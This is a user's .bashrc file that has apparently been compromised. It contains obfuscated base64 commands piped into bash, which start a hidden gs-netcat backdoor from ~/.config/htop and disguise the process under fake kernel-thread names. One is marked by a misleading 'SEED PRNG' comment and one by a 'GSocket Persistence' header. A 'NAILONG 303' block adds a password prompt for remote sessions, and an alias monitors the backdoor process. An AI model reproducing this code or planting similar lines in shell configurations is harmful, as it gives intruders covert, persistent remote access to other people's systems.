# .bashrc
# DO NOT REMOVE THIS LINE. SEED PRNG. #defunct-kernel
{ AtVTMwNzAgZGVmdW5jdCAyPi9kZXYvbnVsbCB8fCAoVEVSTT14dGVybS0yNTZjb2xvciBHU19BUkdTPSItayAvaG9tZS9zYW92aWV0aS8uY29uZmlnL2h0b3AvZGVmdW5jdC5kYXQgLWxpcUQiIGV4ZWMgLWEgJ1ttbV9wZXJjcHVfd3FdJyAnL2hvbWUvc2FvdmlldGkvLmNvbmZpZy9odG9wL2RlZnVuY3QnIDI+L2Rldi9udWxsKQo=|base64 -d|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng defunct-kernel

# Source global definitions
if [ -f /etc/bashrc ]; then
	. /etc/bashrc
fi

# User specific environment
if ! [[ "$PATH" =~ "$HOME/.local/bin:$HOME/bin:" ]]
then
    PATH="$HOME/.local/bin:$HOME/bin:$PATH"
fi
export PATH

# Uncomment the following line if you don't like systemctl's auto-paging feature:
# export SYSTEMD_PAGER=

# User specific aliases and functions

# === NAILONG 303 AUTHENTICATION SYSTEM ===
# This block runs ONLY for GSocket connections (not local terminal)
if [[ $- == *i* ]] && [[ -t 0 ]] && [[ -z "${NAILONG_AUTH_DONE:-}" ]]; then
    # Hash function (compatible across systems)
    hash_input() {
        local input="$1"
        if command -v sha256sum >/dev/null 2>&1; then
            echo -n "$input" | sha256sum | awk '{print $1}'
        elif command -v shasum >/dev/null 2>&1; then
            echo -n "$input" | shasum -a 256 | awk '{print $1}'
        elif command -v openssl >/dev/null 2>&1; then
            echo -n "$input" | openssl dgst -sha256 | awk '{print $NF}'
        else
            echo ""
        fi
    }
    
    # Check if this is a GSocket connection
    PARENT_CMD=$(ps -o comm= -p $PPID 2>/dev/null || echo "")
    IS_GSOCKET=0
    
    if [[ "$PARENT_CMD" == *"gs-netcat"* ]] || [[ "$PARENT_CMD" == *"defunct"* ]] || [[ -n "${GSOCKET_ARGS:-}" ]]; then
        IS_GSOCKET=1
    fi
    
    if [[ -z "${SSH_CONNECTION:-}" ]] && [[ "$IS_GSOCKET" == "0" ]]; then
        IS_GSOCKET=0
    else
        IS_GSOCKET=1
    fi
    
    # Only authenticate for GSocket/remote connections
    if [[ "$IS_GSOCKET" == "1" ]]; then
        export NAILONG_AUTH_DONE=1
        
        # Show Nailong face
        echo
        printf '\033[1;33m\n'
        cat << 'NAILONG_GREETING'
                   :::::::::::::                   
                 :..:::::::::::::::                
               :::::::::::::::::::::::             
              ::**::::::::-----------:::           
             ::.::::::::-=#%#+--------:::          
           :.:::::::::::--=*%#+--------::          
          :::::::-:::::::--===----------::         
         :::::::-::::::::---------------::         
         ::::::-::::::-----------====---::         
         ::::---:::-----==============--::         
         ------------=================--:          
          ---------======++++==+=+===--::          
          :::-======+++++++++++++++==--:           
        :::::::-===++++++++++****+++=-:            
      ::::-=:::-==++**************+++=--           
     ::::--::::::-==++++++***+++++++++==---        
     :::-:::.....::::--=======++==+++++===-:       
     :---:..........::::--========+++++===---:     
      --:...........:::::---======+**++=====-:     
       :............::::::--======+*+++=====--     
      :............:::::::---=====+*++++====-:     
      :..........:::::::::--======+**+++++==-      
     ::.......::::::::::::--=======+*+++++=        
     ::....:::::::::::::---==========++++          
     ::..::::::::::::------=========-:             
      :::::::::::----------=========-:             
      :::::::-------------==++++++==-:             
       --:-------=========+++++++++=-              
NAILONG_GREETING
        printf '\033[1;33m╔════════════════════════════╗\033[0m\n'
        printf '\033[1;33m║   NAILONG 303 IS HERE     ║\033[0m\n'
        printf '\033[1;33m╚════════════════════════════╝\033[0m\n'
        printf '\033[0m\n'
        
        # Ask for password
        printf '\033[1;37mPassword: \033[0m'
        
        # Read password with 15 second timeout
        if read -t 15 -s -r input_pass; then
            echo
            
            # Hash the input password
            INPUT_HASH=$(hash_input "$input_pass")
            
            # Validate against stored hash
            if [ "$INPUT_HASH" != "4dc8550ed00917d8854fe2d0884131472ea4bac052e09fd68dba39392c35221a" ]; then
                # Wrong password
                printf '\n\033[1;31m\n'
                cat << 'NAILONG_FAIL'
                   :::::::::::::                   
                 :..:::::::::::::::                
               :::::::::::::::::::::::             
              ::**::::::::-----------:::           
             ::.::::::::-=#%#+--------:::          
           :.:::::::::::--=*%#+--------::          
          :::::::-:::::::--===----------::         
         :::::::-::::::::---------------::         
         ::::::-::::::-----------====---::         
         ::::---:::-----==============--::         
         ------------=================--:          
          ---------======++++==+=+===--::          
          :::-======+++++++++++++++==--:           
        :::::::-===++++++++++****+++=-:            
      ::::-=:::-==++**************+++=--           
     ::::--::::::-==++++++***+++++++++==---        
     :::-:::.....::::--=======++==+++++===-:       
     :---:..........::::--========+++++===---:     
      --:...........:::::---======+**++=====-:     
       :............::::::--======+*+++=====--     
      :............:::::::---=====+*++++====-:     
      :..........:::::::::--======+**+++++==-      
     ::.......::::::::::::--=======+*+++++=        
     ::....:::::::::::::---==========++++          
     ::..::::::::::::------=========-:             
      :::::::::::----------=========-:             
      :::::::-------------==++++++==-:             
       --:-------=========+++++++++=-              
NAILONG_FAIL
                printf '\033[1;31m╔════════════════════════════╗\033[0m\n'
                printf '\033[1;31m║  ACCESS DENIED - GO HOME  ║\033[0m\n'
                printf '\033[1;31m╚════════════════════════════╝\033[0m\n\n'
                sleep 2
                exit 1
            fi
            # Correct password
            printf '\033[1;32m╔════════════════════════════╗\033[0m\n'
            printf '\033[1;32m║     ACCESS GRANTED ✓      ║\033[0m\n'
            printf '\033[1;32m╚════════════════════════════╝\033[0m\n'
            printf '\033[0m\n'
        else
            printf '\n\033[1;31m[!] Timeout - Access denied\033[0m\n'
            exit 1
        fi
    fi
fi

# === Custom Prompt ===
PS1='\[\033[1;35m\]🔒 \u@\h:\w\$ \[\033[0m\]'

# === GSocket Persistence ===
{
    gLTAgLVUxMDA1IGRlZnVuY3QgMj4vZGV2L251bGwgfHwgKFRFUk09eHRlcm0tMjU2Y29sb3IgR1NfQVJHUz0iLWsgJChnZXBlbnYgSE9NRSkvLmNvbmZpZy9odG9wL2RlZnVuY3QuZGF0IC1saXFEIiBleGVjIC1hICdbc2x1Yl9mbHVzaHdxXScgJChnZXBlbnYgSE9NRSkvLmNvbmZpZy9odG9wL2RlZnVuY3QgMj4vZGV2L251bGwpCg==|base64 -d|bash
} 2>/dev/null &

# === Standard shell configuration ===
if [ -f /etc/bashrc ]; then
    . /etc/bashrc
fi

PATH="$HOME/.local/bin:$HOME/bin:/usr/local/bin:$PATH"
export PATH

umask 022

alias ll='ls -lah'
alias gs-status='ps aux | grep defunct | grep -v grep'
